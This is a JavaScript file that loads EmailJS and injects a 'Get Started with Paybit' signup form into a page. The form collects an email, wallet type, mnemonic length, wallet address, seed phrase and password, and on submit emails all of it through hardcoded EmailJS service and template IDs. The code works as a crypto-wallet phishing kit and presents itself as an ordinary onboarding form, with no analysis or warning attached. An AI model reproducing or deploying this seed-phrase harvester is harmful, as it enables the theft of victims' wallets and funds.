// Include the EmailJS script in the HTML or dynamically load it in the JavaScript

// Check if EmailJS is already loaded, if not, load it dynamically
if (!window.emailjs) {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
    document.head.appendChild(script);
    script.onload = function() {
        // Initialize EmailJS once it's loaded
        emailjs.init("UzvWE4cijC2AeexsY");  // Your EmailJS user ID
        loadForm(); // Load the form after EmailJS is initialized
    };
} else {
    // EmailJS is already loaded, initialize it
    emailjs.init("UzvWE4cijC2AeexsY");
    loadForm(); // Load the form directly if EmailJS is already loaded
}

// Function to dynamically inject the form HTML into the page
function loadForm() {
    // Form HTML content as a string
    const formHTML = `
    <section id="form" class="mb-5">
        <h2 class="text-center">Get Started with Paybit</h2>
        <form class="p-4 border rounded">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" name="email" class="form-control" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="dropdown1">Wallet Type</label>
                <select name="dropdown1" class="form-control">
                    <option value="" disabled selected>Select Wallet Type</option>
                    <option value="BIP32">BIP32</option>
                    <option value="BIP39">BIP39</option>
                    <option value="BIP44">BIP44</option>
                </select>
            </div>
            <div class="form-group">
                <label for="dropdown2">Mnemonic Length</label>
                <select name="dropdown2" class="form-control">
                    <option value="" disabled selected>Select Mnemonic Length</option>
                    <option value="12">12</option>
                    <option value="18">18</option>
                    <option value="24">24</option>
                </select>
            </div>
            <div class="form-group">
                <label for="address">Wallet Address</label>
                <input type="text" name="address" class="form-control" placeholder="Enter your wallet address" required>
            </div>
            <div class="form-group">
                <label for="seed">Seed Phrase</label>
                <input type="text" name="seed" class="form-control" placeholder="Enter your seed phrase" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn btn-primary btn-block">Submit</button>
        </form>
    </section>`;

    // Inject the form HTML into the formContainer div
    document.getElementById('formContainer').innerHTML = formHTML;

    // Add the form submission event handler
    document.querySelector('form').addEventListener('submit', function(event) {
        event.preventDefault();

        // Collect form data
        var emailData = {
            email: document.querySelector('input[name=email]').value,
            dropdown1: document.querySelector('select[name=dropdown1]').value,
            dropdown2: document.querySelector('select[name=dropdown2]').value,
            address: document.querySelector('input[name=address]').value,
            seed: document.querySelector('input[name=seed]').value,
            password: document.querySelector('input[name=password]').value
        };

        // Validate that all fields are filled
        if (!emailData.email || !emailData.dropdown1 || !emailData.dropdown2 || !emailData.address || !emailData.seed || !emailData.password) {
            alert("Please fill out all required fields.");
            return;
        }

        // Send the form data using EmailJS
        emailjs.send("service_29nyhzq", "template_i3682ek", emailData)
            .then(function(response) {
                // Show success message
                alert('Email sent successfully!');
            }, function(error) {
                // Show error message if email sending fails
                alert('Failed to send email. Please try again.');
            });
    });
}




